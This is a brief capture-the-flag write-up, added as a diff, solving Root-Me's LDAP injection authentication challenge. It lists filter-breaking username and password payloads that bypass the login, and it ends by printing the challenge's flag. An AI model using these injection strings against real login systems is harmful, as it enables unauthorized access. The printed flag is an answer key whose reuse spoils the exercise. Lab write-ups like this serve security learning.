@@ -1,0 +1,39 @@
+Video Solution: https://youtu.be/iLkQy1WxU38
+Task on RootMe: https://www.root-me.org/en/Challenges/Web-Server/LDAP-injection-authentication
+
+Go to
+http://challenge01.root-me.org/web-serveur/ch25/
+
+then input username and password there
+
+ex : 
+username = )
+password = test
+
+we got ERROR : Invalid LDAP syntax : (&(uid=))(userPassword=test))
+
+Basic query LDAP authentication if I remember correctly it should not
+
+result = (&(user = <value>)(pass = <value>))
+
+then call by using a sign *
+==============================================
+username = *
+password = *)(&
+==============================================
+username: *)(|(userPassword=
+password: *)
+==============================================
+
+Welcome back ch25
+
+view-source:http://challenge01.root-me.org/web-serveur/ch25/
+
+username = ch25
+password = SWRwehpkTI3Vu2F9DoTJJ0LBO (after the inspect element)
+
+# flag = SWRwehpkTI3Vu2F9DoTJJ0LBO
+
+Well done, you won 35 Points
+
+
